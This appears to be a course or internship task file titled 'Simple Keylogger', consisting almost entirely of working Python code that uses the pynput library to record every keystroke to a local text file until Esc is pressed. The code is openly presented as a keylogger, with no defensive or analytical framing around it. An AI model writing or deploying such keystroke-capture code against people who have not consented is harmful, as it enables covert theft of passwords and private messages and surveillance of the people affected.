# PRODIGY_cs_04
Simple Keylogger
from pynput.keyboard import Key, Listener

# File to store the logged keys
log_file = "keylog.txt"

def on_press(key):
    try:
        # Log normal characters
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Log special keys
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    # Stop listener on pressing 'Esc'
    if key == Key.esc:
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
